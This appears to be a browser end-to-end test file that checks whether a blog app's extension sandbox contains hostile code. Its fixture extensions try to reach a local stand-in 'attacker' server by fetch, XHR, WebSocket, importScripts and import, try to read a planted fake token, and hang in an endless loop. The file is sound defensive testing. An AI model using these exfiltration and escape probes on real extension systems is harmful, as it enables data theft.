// Gate X2, in a real browser: a build extension runs in a Worker with no DOM, no network and no
// credentials. Hostile extensions try everything; nothing reaches the "attacker" server.
// Run with: npm run test:e2e   (skips itself when Chrome is not installed)
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { cp, mkdtemp, readFile, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { serve } from '../../cli/serve.js';
import { chromePath, launch, openPage } from './cdp.mjs';

const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..', '..');
const skip = chromePath() ? false : 'Chrome is not installed (set CHROME=/path/to/chrome)';

async function attacker() {
  const hits = [];
  const server = http.createServer((req, res) => { hits.push(`${req.method} ${req.url}`); res.setHeader('access-control-allow-origin', '*'); res.end('x'); });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  return { hits, port: server.address().port, close: () => server.close() };
}

const hostile = (port) => `
export const hooks = { async 'post:html'() {
  const out = {};
  const t = (n, fn) => { try { out[n] = fn(); } catch (e) { out[n] = 'threw ' + e.name; } };
  const ta = async (n, fn) => { try { out[n] = await fn(); } catch (e) { out[n] = 'rejected ' + e.name; } };
  for (const n of ['fetch','XMLHttpRequest','WebSocket','EventSource','WebTransport','indexedDB','caches','localStorage','sessionStorage','BroadcastChannel','Worker','SharedWorker','importScripts','document','window','parent','top','opener']) t('typeof ' + n, () => typeof globalThis[n]);
  t('proto fetch', () => { const f = []; for (let o = self; o; o = Object.getPrototypeOf(o)) if (typeof o.fetch === 'function') f.push(o.constructor.name); return f.join(',') || 'none'; });
  t('origin', () => String(self.origin));
  t('eval', () => String(eval('1+1')));
  t('Function', () => String(new Function('return 1')()));
  const L = 'http://127.0.0.1:${port}/leak';
  await ta('fetch', async () => String((await self.fetch(L + '?fetch')).status));
  await ta('xhr', async () => { const x = new XMLHttpRequest(); x.open('GET', L + '?xhr'); x.send(); return 'sent'; });
  await ta('ws', async () => { new WebSocket('ws://127.0.0.1:${port}/ws'); return 'opened'; });
  await ta('worker', async () => { new Worker('data:text/javascript,1'); return 'spawned'; });
  await ta('importScripts', async () => { importScripts(L + '?is'); return 'ran'; });
  await ta('import', async () => { await import(L + '.js?import'); return 'imported'; });
  await ta('secret', async () => JSON.stringify([self.name, String(self.location)]).includes('SECRET') ? 'LEAKED' : 'not visible');
  return JSON.stringify(out);
} };`;

const BENIGN = `export const hooks = { 'post:html'(html) { return '<p class="reading-time">1 min read</p>' + html; } };`;

async function withBrowser(appRoot, fn) {
  const web = await serve(appRoot);
  const evil = await attacker();
  const chrome = await launch();
  try {
    const page = await openPage(chrome, `http://127.0.0.1:${web.address().port}/index.html`);
    await new Promise((r) => setTimeout(r, 1000));
    await page.evaluate("localStorage.setItem('blog.webcli.token', 'github_pat_SECRET'); 0");
    await fn({ page, evil });
    page.close();
  } finally {
    chrome.close();
    web.close();
    evil.close();
  }
}

test('X2: hostile extensions in the real sandbox reach nothing', { skip, timeout: 120000 }, async () => {
  await withBrowser(root, async ({ page, evil }) => {
    const out = JSON.parse(
      await page.evaluate(`(async () => {
        const { createSandbox } = await import('/app/sandbox.js');
        const sb = createSandbox({ timeoutMs: 1500 });
        const out = {};
        const run = async (name, source) => { try { out[name] = await sb.run({ source, hook: 'post:html', input: '<p>x</p>', ctx: {}, label: name }); } catch (e) { out[name] = 'REJECTED: ' + (e.detail || e.message); } };
        await run('benign', ${JSON.stringify(BENIGN)});
        await run('hostile', ${JSON.stringify(hostile(evil.port))});
        await run('throws', ${JSON.stringify("export const hooks = { 'post:html'() { throw new Error('boom'); } };")});
        await run('no hook', ${JSON.stringify('export const hooks = {};')});
        await run('static import', ${JSON.stringify(`import 'http://127.0.0.1:${evil.port}/s.js'; export const hooks = { 'post:html'(h) { return h; } };`)});
        const t0 = performance.now();
        await run('loop', ${JSON.stringify("export const hooks = { 'post:html'() { for (;;) {} } };")});
        out.loopMs = Math.round(performance.now() - t0);
        await run('after loop', ${JSON.stringify(BENIGN)});
        const frame = document.querySelector('iframe');
        out.sandboxAttr = frame.getAttribute('sandbox');
        out.parentReadsFrame = (() => { try { return String(frame.contentWindow.document.body); } catch (e) { return 'blocked ' + e.name; } })();
        out.token = localStorage.getItem('blog.webcli.token');
        sb.dispose();
        out.framesLeft = document.querySelectorAll('iframe').length;
        return JSON.stringify(out);
      })()`),
    );
    await new Promise((r) => setTimeout(r, 500));
    assert.equal(out.benign, '<p class="reading-time">1 min read</p><p>x</p>');
    const h = JSON.parse(out.hostile);
    for (const k of Object.keys(h).filter((k) => k.startsWith('typeof '))) assert.equal(h[k], 'undefined', k);
    assert.equal(h['proto fetch'], 'none');
    assert.equal(h.origin, 'null', 'an opaque origin');
    assert.equal(h.eval, 'threw EvalError');
    assert.equal(h.Function, 'threw EvalError');
    for (const k of ['fetch', 'xhr', 'ws', 'worker', 'importScripts', 'import']) assert.match(h[k], /^rejected/, k);
    assert.equal(h.secret, 'not visible');
    assert.match(out.throws, /boom/);
    assert.match(out['no hook'], /does not implement post:html/);
    assert.match(out['static import'], /^REJECTED/);
    assert.match(out.loop, /did not finish/);
    assert.ok(out.loopMs < 4000, `the loop was stopped in ${out.loopMs} ms`);
    assert.equal(out['after loop'], '<p class="reading-time">1 min read</p><p>x</p>', 'the sandbox recovers');
    assert.equal(out.sandboxAttr, 'allow-scripts', 'and never allow-same-origin');
    assert.match(out.parentReadsFrame, /^blocked/, 'not even the editor can read the frame');
    assert.equal(out.token, 'github_pat_SECRET');
    assert.equal(out.framesLeft, 0);
    assert.deepEqual(evil.hits, [], 'no request reached the attacker');
  });
});

test('X2: the frame CSP alone blocks the network, even if the capability removal were absent', { skip, timeout: 120000 }, async () => {
  // a copy of the app with the bootstrap's capability removal deleted
  const copy = await mkdtemp(path.join(os.tmpdir(), 'blog-weak-'));
  await cp(path.join(root, 'app'), path.join(copy, 'app'), { recursive: true });
  await cp(path.join(root, 'lib'), path.join(copy, 'lib'), { recursive: true });
  await cp(path.join(root, 'index.html'), path.join(copy, 'index.html'));
  const js = await readFile(path.join(copy, 'app', 'sandbox-frame.js'), 'utf8');
  const a = js.indexOf('    const GONE = [');
  const b = js.indexOf("    try { Object.defineProperty(navigator");
  assert.ok(a > 0 && b > a);
  await writeFile(path.join(copy, 'app', 'sandbox-frame.js'), js.slice(0, a) + js.slice(b));

  await withBrowser(copy, async ({ page, evil }) => {
    const src = `export const hooks = { async 'post:html'() {
      const out = { fetch: typeof fetch, xhr: typeof XMLHttpRequest, ws: typeof WebSocket };
      const t = async (n, fn) => { try { out[n + 'Result'] = await fn(); } catch (e) { out[n + 'Result'] = 'blocked'; } };
      await t('fetch', async () => String((await fetch('http://127.0.0.1:${evil.port}/a')).status));
      await t('xhr', () => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open('GET', 'http://127.0.0.1:${evil.port}/b'); x.onload = () => res('loaded'); x.onerror = () => rej(new Error('e')); x.send(); }));
      await t('ws', () => new Promise((res, rej) => { const w = new WebSocket('ws://127.0.0.1:${evil.port}/c'); w.onopen = () => res('open'); w.onerror = () => rej(new Error('e')); }));
      await t('import', async () => { await import('http://127.0.0.1:${evil.port}/d.js'); return 'imported'; });
      return JSON.stringify(out);
    } };`;
    const out = JSON.parse(await page.evaluate(`(async () => {
      const { createSandbox } = await import('/app/sandbox.js');
      const sb = createSandbox({ timeoutMs: 8000 });
      const r = await sb.run({ source: ${JSON.stringify(src)}, hook: 'post:html', input: '', ctx: {}, label: 'csp' });
      sb.dispose();
      return r;
    })()`));
    await new Promise((r) => setTimeout(r, 500));
    assert.deepEqual([out.fetch, out.xhr, out.ws], ['function', 'function', 'function'], 'the capabilities really were present');
    for (const k of ['fetchResult', 'xhrResult', 'wsResult', 'importResult']) assert.equal(out[k], 'blocked', k);
    assert.deepEqual(evil.hits, []);
  });
});
